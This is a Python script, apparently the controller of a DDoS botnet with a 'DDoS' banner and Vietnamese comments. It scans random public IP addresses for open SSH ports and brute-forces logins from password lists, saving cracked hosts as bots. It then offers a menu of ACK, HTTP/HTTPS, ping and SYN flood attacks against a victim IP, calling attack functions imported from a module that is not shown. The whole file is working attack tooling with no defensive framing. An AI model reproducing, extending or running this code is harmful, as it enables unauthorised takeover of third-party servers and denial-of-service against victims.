import paramiko
import time
import random
import socket
import struct
from ataque import load_ataque
from ataque import all_bots
from ataque import list_of_bots
from ataque import select_bot
from ataque import single_bot
from ataque import sftp
from ataque import bots_alive
from ataque import delete_list
from ataque import attack

USER=[]
PASS=[]
total_list=0

def load(option):

    global total_list

    if option==1:
        with open("passwords.txt","r") as f:
            for line in f:
                USER.append(line.split(":")[0])
                PASS.append(line.strip("\n").split(":")[1])
                total_list+=1
    # mở file password.txt và đọc từng dòng trong file để tách tên đăng nhập, mật khẩu 
    # Lưu tên đăng nhập vào danh sách USER và lưu mật khẩu vào danh sách PASS             
    if option==2:
        with open("passwords_small.txt","r") as f:
            for line in f:
                USER.append(line.split(":")[0])
                PASS.append(line.strip("\n").split(":")[1])
                total_list+=1
     #Hàm này là một hàm load dữ liệu từ file "passwords_small.txt" vào 2 list USER và PASS       
def conexion(ip, option):

    equipos=open("equipos.txt","a")

    for i in range(total_list):

        try:

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )

            message=ssh.connect(ip, username=USER[i], password=PASS[i])

            print(f'[*] Authentication Worked IP:{ip} USER:{USER[i]} PASS={PASS[i]}')

            equipos.write(f'{ip}:{USER[i]}:{PASS[i]}:NS\n')
            equipos.close()

            ssh.close()

            break

        except paramiko.ssh_exception.AuthenticationException:

            print(f'[*] Authentication Failed IP:{ip} USER:{USER[i]} PASS={PASS[i]}')

        except paramiko.SSHException:

            print(f'[*] Device Failed Executing the Command IP:{ip} USER:{USER[i]} PASS={PASS[i]}')
            break

        except socket.error:

            print(f'[*] Connection Failed IP:{ip} USER:{USER[i]} PASS={PASS[i]}')
            break

        ssh.close()

def IP():
#tạo ra một địa chỉ IP ngẫu nhiên và kiểm tra xem địa chỉ IP đó có hợp lệ hay không.
    random_ip=socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
    sv=int(random_ip.split(".")[0])
    sb=int(random_ip.split(".")[1])
    while(sv==127 or sv==0 or sv==3 or sv==15 or sv==56 or sv==10 or (sv==192 and sb==168) or (sv == 172 and sb >= 16 and sb < 32) or (sv == 100 and sb >= 64 and sb < 127) or (sv==169 and sb>254) or (sv==198 and sb>= 18 and sb<20) or sv>=224 or sv==6 or sv==7 or sv==11 or sv==21 or sv==22 or sv==26 or sv==28 or sv==29 or sv==30 or sv==33 or sv==55 or sv==214 or sv==215):
        print(f'[*] IP {random_ip} not valid\n')
        return False
    print(f'[*] IP {random_ip} valid')
    return random_ip

def alive(ip):
# Hàm này để kiểm tra IP có tồn tại hay không
    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    location=(ip,22)
    a_socket.settimeout(0.05)

    result_of_check = a_socket.connect_ex(location)

    if result_of_check == 0:
        print(f"    +---> {ip} with Port 22 is open\n")
        a_socket.close()
        return True
    else:
        print(f"    +---> {ip} with Port 22 is not open\n")
        a_socket.close()
        return False

def cls(): print("\n"*20)

def none_bots(bot):
    if bot==0:
        print("\nNot enough bots to start an attack, Press enter to exit: ")
        exit(0)

if __name__ == '__main__':

    while 1:

        option=int(input('''

   

                    ·▄▄▄▄  ·▄▄▄▄        .▄▄ · 
                    ██▪ ██ ██▪ ██ ▪     ▐█ ▀. 
                    ▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
                    ██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█
                    ▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ 
                                                                                 
           +------------------------------------------------------+
           |                                                      |
           |                   1) Bots Alive                      |
           |                                                      |
           |                   2) Bot Collect                     |
           |                                                      |
           |                   3) ACK Attack                      |
           |                                                      |
           |                   4) HTTP/HTTPS Attack               |
           |                                                      |
           |                   5) PING Attack                     |
           |                                                      |
           |                   6) SYN Attack ( Best Attack )      |                               
           |                                                      |
           |                                                      |
           +------------------------------------------------------+

Select the option: '''))

        if option==1:

            load_ataque()
            x=bots_alive()
            none_bots(x)
            delete_list()
            input("\nPress enter to continue...")
            cls()


        if option==2:

            option=int(input('''
            1) passwords.txt ( 136 combinations, this file goes slower but it has more combos )
            2) passwords_small.txt ( 4 combinations, this file goes faster but it has less combos )

            Select the option: '''))

            load(option)

            while 1:

                    a=IP()

                    if a==False:

                        continue

                    if alive(a) == True:

                        try:

                            conexion(a,option)

                        except:

                            continue


        if option==3:#ack attack

            load_ataque()
            x=bots_alive()
            none_bots(x)
            ip=input("\nGive me the victim's ip: ")
            port=str(input("Give me the victim's port: "))
            attack(ip, 3, port, "-A")
            input("\nThe attack is being made. Press enter to continue...")
            delete_list()
            cls()


        if option==4:#http/https

            load_ataque()
            x=bots_alive()
            none_bots(x)
            ip=input("\nGive the the victim's ip: ")
            attack(ip, 1, None, None)
            input("\nThe attack is being made. Press enter to continue...")
            delete_list()
            cls()


        if option==5:#ping attack

            load_ataque()
            x=bots_alive()
            none_bots(x)
            ip=input("\nGive me the victim's ip: ")
            attack(ip, 2, None, None)
            input("\nThe attack is being made. Press enter to continue...")
            delete_list()
            cls()

        if option==6:#syn attack

            load_ataque()
            x=bots_alive()
            none_bots(x)
            ip=input("\nGive me the victim's ip: ")
            port=str(input("Give me the victim's port: "))
            attack(ip, 3, port, "-S")
            input("\nThe attack is being made. Press enter to continue...")
            delete_list()
            cls()

        

        
